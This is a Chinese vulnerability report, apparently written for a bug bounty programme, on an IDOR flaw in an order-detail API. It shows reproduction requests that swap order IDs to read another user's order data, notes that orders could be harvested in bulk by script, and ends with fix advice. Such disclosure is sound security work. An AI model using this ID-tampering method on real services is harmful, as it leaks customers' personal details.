# 【高风险】XXX系统订单接口水平越权

## 1. 漏洞信息

| 项 | 内容 |
|---|---|
| 影响域名 | https://sub.target.com |
| 漏洞类型 | 越权访问（IDOR） |
| 危害等级 | 高风险 |
| 是否需要登录 | 是（任意普通用户） |
| 复现难度 | 低 |

## 2. 复现步骤

**步骤 1**：注册两个测试账号 A（13800000001）和 B（13800000002）

**步骤 2**：用 A 登录，获取 A 的 token 与自己的订单号

```
GET /api/order/detail?orderId=202610300001 HTTP/1.1
Host: sub.target.com
Authorization: Bearer <A的token>
```

返回 A 的订单详情，正常。

**步骤 3**：保持 A 的 token 不变，将 orderId 改为 B 的订单号

```
GET /api/order/detail?orderId=202610300002 HTTP/1.1
Host: sub.target.com
Authorization: Bearer <A的token>
```

**步骤 4**：服务器返回 B 的完整订单信息（含收货人、手机号、地址、金额）

```json
{"orderId":"202610300002","receiver":"李*","phone":"139****5678",
 "address":"XX省XX市XX区XX路XX号","amount":1280.00}
```

## 3. 影响范围与危害

- 任意登录用户可遍历全部订单，orderId 为可预测的日期+序列
- 泄露收货人姓名、手机号、详细地址、购买商品、金额
- 可推断用户消费能力与住址，用于精准诈骗与人身安全威胁
- 结合订单号规律，可脚本化批量拉取全站订单

## 4. 修复建议

1. 查询订单前校验 orderId 归属：`WHERE order_id = ? AND user_id = current_user`
2. 禁止前端传入 user_id，一律从 token 解析
3. 对订单号做不可预测化（UUID 或加盐哈希）
4. 增加单账号查询频次限制与异常告警

## 5. 佐证材料

- 附件1：A 的 token 请求 B 订单的完整请求响应
- 附件2：两个账号的注册与登录截图
- 附件3：资产范围截图

## 6. 测试边界声明

仅使用本人注册的两个测试账号互测，未访问任何真实用户数据，
未记录任何他人订单信息，截图已做脱敏处理。
